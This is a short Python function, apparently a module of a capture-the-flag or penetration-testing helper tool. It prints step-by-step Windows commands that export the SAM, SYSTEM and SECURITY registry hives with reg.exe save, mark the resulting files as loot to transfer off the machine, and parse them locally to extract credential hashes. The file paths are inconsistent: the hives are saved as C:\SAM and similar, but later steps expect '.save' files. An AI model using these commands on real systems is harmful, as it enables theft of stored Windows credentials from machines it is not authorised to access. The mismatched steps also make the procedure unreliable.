def run(data, cred, args):
    # --- CLEAN UI PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    W_BOLD, DIM = '\033[1m', '\033[2m'

    print(f"\n{W_BOLD}[*] REGISTRY HIVE EXPORT (SAM/SYSTEM/SECURITY){W}")

    # 1. Hive Export Targets
    print(f"\n{W_BOLD}[*] Export SAM Hive:{W}")
    print(f"      {Y}reg.exe save hklm\\sam C:\\SAM{W}")

    print(f"\n{W_BOLD}[*] Export SYSTEM Hive:{W}")
    print(f"      {Y}reg.exe save hklm\\system C:\\SYSTEM{W}")

    print(f"\n{W_BOLD}[*] Export SECURITY Hive:{W}")
    print(f"      {Y}reg.exe save hklm\\security C:\\SECURITY{W}")

    # 2. Verification Steps
    print(f"\n{W_BOLD}[*] Verify Generated Files:{W}")
    print(f"      {Y}dir C:\\*.save{W}")

    # 3. Target Loot Transfer
    print(f"\n{W_BOLD}[*] Target Transfer Files:{W}")
    print(f"      {G}C:\\sam.save{W}")
    print(f"      {G}C:\\system.save{W}")
    print(f"      {G}C:\\security.save{W}")

    # 4. Parsing Next Action
    print(f"\n{W_BOLD}[*] Parsing Command (Local Machine):{W}")
    print(f"      {C}ctf dump.hives --sam sam.save --system system.save{W}\n")

    return data